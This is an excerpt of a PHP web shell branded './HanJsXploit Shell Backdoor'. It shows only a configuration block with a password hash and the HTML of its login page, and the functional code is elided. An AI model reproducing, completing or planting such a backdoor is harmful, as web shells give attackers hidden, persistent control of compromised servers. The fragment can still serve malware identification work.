...
/* Configurasi */
$auth_pass 			= "6d37aadccdeaf672a0d11836d07a97cc";// HanJs
$color 				= "#00ff00";
...
<html>
	<head>
		...
		<title>{ ./HanJsXploit Shell Backdoor }</title>
			...
			<div class="container" style="margin-top: 15%">
				<div class="col-lg-6">
					<div class="form-group">
						<h1 class="text-center">[+] ./HanJsXploit Shell Backdoor [+]</h1>
...
<html>
	<head>
		...
		<meta name="author" content="Holiq"/>
		<meta name="copyright" content="./HanJsXploit Shell Backdoor"/>
		<link rel="icon" type="image/png" href="https://www.indsc.me/images/logo.png"/>
		<title>./HanJsXploit Shell Backdoor</title>
